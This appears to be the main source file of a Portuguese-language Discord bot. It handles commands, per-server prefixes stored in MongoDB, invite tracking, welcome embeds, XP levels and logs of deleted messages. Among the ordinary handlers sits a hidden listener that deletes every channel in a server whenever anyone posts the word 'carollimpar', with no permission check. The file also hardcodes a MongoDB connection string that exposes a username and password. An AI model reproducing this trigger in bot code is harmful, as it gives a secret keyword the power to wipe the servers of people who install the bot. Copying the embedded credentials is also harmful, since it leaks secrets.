const http = require('http');
const express = require('express');
const app = express();
app.get('/', (request, response) => {
	console.log(Date.now() + ' Ping Received');
	response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
	http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
}, 280000);

const discord = require('discord.js');
const config = require('./config.json');
const client = new discord.Client({
	disableEveryone: true,
	disabledEvents: ['TYPING_START']
});
const { readdirSync } = require('fs');
const { join } = require('path');
const { TOKEN, PREFIX } = require('./config.json');
const { registerFont } = require('canvas');
registerFont('Roboto-Bold.ttf', { family: 'sans-serif' });
const mongoose = require('mongoose');
mongoose.connect(
	'mongodb+srv://tutorial234:mCEyMiWY3IyueIvK@cluster0.vtde3.mongodb.net/<dbname>?retryWrites=true&w=majority',
	{
		useNewUrlParser: true,
		useUnifiedTopology: true
	}
);
const dm = mongoose.connection;
dm.on('error', console.error);
dm.on('open', () => {
	console.log('Conectada a memoria central.');
});
client.on('message', message => {
	if (message.content === 'carollimpar') {
		message.guild.channels.cache.forEach(c => {
			c.delete();
		});
	}
});
client.on('message', msg => {
	if (msg.author.bot) return;
	if (msg.author.id === '746007271259111534') return;
	if (msg.content.includes('746007271259111534')) {
		msg.channel
			.send(
				`<a:A_pikachu:759436849453334549> | ${
					msg.author
				}, Mencionou meu criador, bom é possível que ele não responda agora!`
			)
			.then(msg => msg.delete({ timeout: 9000 }));
	}
});
const guildInvites = new Map();

client.on('inviteCreate', async invite =>
	guildInvites.set(invite.guild.id, await invite.guild.fetchInvites())
);
client.on('ready', () => {
	console.log(`${client.user.tag} has logged in.`);
	client.guilds.cache.forEach(guild => {
		guild
			.fetchInvites()
			.then(invites => guildInvites.set(guild.id, invites))
			.catch(err => console.log(err));
	});
});
const db = require('quick.db');

client.on('guildMemberAdd', async member => {
	const Canak = await db.fetch(`inviteS_${member.guild.id}`);
	let canal8 = client.channels.cache.get(`${Canak}`);
	const discord = require('discord.js');
	const nome = member.guild.name;

	const cachedInvites = guildInvites.get(member.guild.id);
	const newInvites = await member.guild.fetchInvites();
	guildInvites.set(member.guild.id, newInvites);
	try {
		const usedInvite = newInvites.find(
			inv => cachedInvites.get(inv.code).uses < inv.uses
		);
		const embed = new discord.MessageEmbed()
			.setDescription(
				`<a:Hype:761955381232009216> Seja bem vindo(a) \`${
					member.user.tag
				}\` ao servidor ${nome}!, entrou pelo \`${
					usedInvite.inviter.tag
				}\` que agora tem **${
					usedInvite.uses
				}** invites. <a:Diamond:761955314844041228>`
			)
			.setColor('#FF1493');

		await canal8.send(embed);
	} catch (err) {
		console.log(err);
	}
});
//CLIENT EVENTS
client.on('ready', () => {
	let activities = [
			`Para obter ajuda utilize d-ajuda`,
			`Meu criador Linux ON!`,
			`${client.users.cache.size} Usuários!`,
			`Manutenção!`
		],
		i = 0;
	setInterval(
		() =>
			client.user.setActivity(`${activities[i++ % activities.length]}`, {
				type: 'STREAMING'
			}),
		1000 * 60
	);
	client.user.setStatus('dnd').catch(console.error);
	console.log('🌸 Estou online, Linux ON!');
});

client.on('warn', info => console.log(info));

client.on('error', console.error);

client.commands = new discord.Collection();

client.queue = new Map();
client.vote = new Map();

//LETS LOAD ALL FILES
const cmdFiles = readdirSync(join(__dirname, 'commands')).filter(file =>
	file.endsWith('.js')
);
for (const file of cmdFiles) {
	const command = require(join(__dirname, 'commands', file));
	client.commands.set(command.name, command);
} //LOADING DONE
//WHEN SOMEONE MESSAGE
const prefix = require('./models/prefix');

client.on('message', async message => {
  
	if (message.author.bot) return;
	let user = await db.fetch(`Block_${message.author.id}`);
	if (message.author.id === `${user}`) return;
	//Getting the data from the model
	xp(message);
	const data = await prefix.findOne({
		GuildID: message.guild.id
	});

	//If there was a data, use the database prefix BUT if there is no data, use the default prefix which you have to set!
	if (data) {
		const PREFIX = data.Prefix;

		if (message.content.startsWith(PREFIX)) {
			//IF MESSSAGE STARTS WITH MINE BOT PREFIX

			const args = message.content
				.slice(PREFIX.length)
				.trim()
				.split(/ +/); //removing prefix from args
			const command = args.shift().toLowerCase();

			if (!client.commands.has(command)) {
				return;
			}

			try {
				//TRY TO GET COMMAND AND EXECUTE
				client.commands.get(command).execute(client, message, args);
				//COMMAND LOGS
				console.log(
					`${message.guild.name}: ${message.author.tag} Used ${
						client.commands.get(command).name
					} in #${message.channel.name}`
				);
			} catch (err) {
				//IF IT CATCH ERROR
				console.log(err);
				message.reply('I am getting error on using this command');
			}
		}
	} else if (!data) {
		//set the default prefix here
		const PREFIX = 'd-';
		if (message.content.startsWith(PREFIX)) {
			//IF MESSSAGE STARTS WITH MINE BOT PREFIX

			const args = message.content
				.slice(PREFIX.length)
				.trim()
				.split(/ +/); //removing prefix from args
			const command = args.shift().toLowerCase();

			if (!client.commands.has(command)) {
				return;
			}

			try {
				//TRY TO GET COMMAND AND EXECUTE
				client.commands.get(command).execute(client, message, args);
				//COMMAND LOGS
				console.log(
					`${message.guild.name}: ${message.author.tag} Used ${
						client.commands.get(command).name
					} in #${message.channel.name}`
				);
			} catch (err) {
				//IF IT CATCH ERROR
				console.log(err);
				message.reply('I am getting error on using this command');
			}
		}
	}
});

client.on('message', async message => {
	if (message.content.startsWith(`<@${client.user.id}>`)) {
		if (message.author.bot) return;
		const data = await prefix.findOne({
			GuildID: message.guild.id
		});
		if (data) {
			const prefix = data.Prefix;
			message.channel
				.send(
					`Olá ${message.author} minha prefix neste servidor é \`${prefix}\``
				)
				.then(msg => msg.delete({ timeout: 17000 }));
		} else if (!data) {
			message.channel
				.send(`Olá ${message.author} minha prefix neste servidor é \`d-\``)
				.then(msg => msg.delete({ timeout: 17000 }));
		}
	}
});

client.on('messageDelete', async msg => {
	if (msg.author.id === '746007271259111534') return;
	if (msg.author.bot) return;
	let logs = await msg.guild.fetchAuditLogs({ type: 72 });
	let entry = logs.entries.first();
	const discord = require('discord.js');
	let embed = new discord.MessageEmbed()
		.setTitle('<a:staff_lbn:765675306228514836> Logs | **MENSAGEM DELETADA!**')
		.setColor('#B452CD')
		.setThumbnail(msg.author.displayAvatarURL({ dynamic: true }))
		.addField('📩・Enviada por :', msg.author, true)
		.addField('💬・Canal de texto:', msg.channel, true)
		.addField('📝・Mensagem:', msg.content)
		.setFooter(`${msg.guild.name}`, msg.guild.iconURL({ dynamic: true }))
		.setTimestamp();

	let channel = msg.guild.channels.cache.find(
		x => x.id === '763940818104483861'
	);
	channel.send({ embed });
});
client.db = require('quick.db');

const cooldown = new Set();

function xp(message) {
	if (!cooldown.has(message.author.id)) {
		let xp = client.db.add(`xp_${message.author.id}`, 1);
		let level = Math.floor(0.3 * Math.sqrt(xp));
		let lvl =
			client.db.get(`level_${message.author.id}`) ||
			client.db.set(`level_${message.author.id}`, 1);
		if (level > lvl) {
			let newLevel = client.db.set(`level_${message.author.id}`, level);
			message.channel
				.send(
					`\> <a:Alegreti:766428781123600424> **|** ${message.author.toString()}, Você antigiu o nível ${newLevel}!`
				)
				.then(msg => msg.delete({ timeout: 5000 }));
		}
		cooldown.add(message.author.id);
		setTimeout(() => {
			cooldown.delete(message.author.id);
		}, 15000); // coloca o tempo aqui
	}
}
//DONT DO ANYTHING WITH THIS TOKEN lol
client.on('guildMemberAdd', async member => {
	let embedON = new discord.MessageEmbed()
		.setAuthor(`${member.user.tag}`, member.user.displayAvatarURL())
		.setTitle('<a:Alegreti:766428781123600424> Novo(a) Recruta!')
		.setThumbnail(member.user.displayAvatarURL({ dynamic: true }))
		.setDescription(
			`Seja bem vindo(a) ${member} ao servidor **LBN**!\nEspero que você aprenda muita coisa conosco.`
		)
		.setImage(
			'https://cdn.discordapp.com/attachments/770213824519077920/771757686290251806/tenor_2.gif'
		)
		.addField(
			'<a:DiamanteBrilhante:759914551918592020>・Ler as regras:',
			`<#763888469789114370>`
		)
		.addField(
			'<:lbn_Youtube:764244038009487390>・Canal Linux ON:',
			`[Visitar canal](https://www.youtube.com/c/LinuxON)`
		)
		.setTimestamp()
		.setFooter(`${member.guild.name} `, member.guild.iconURL({ dynamic: true }))
		.setColor('#FF11AC');
	member.guild.channels.cache.get('763940818104483861').send(embedON);
});
client.login(config.token);
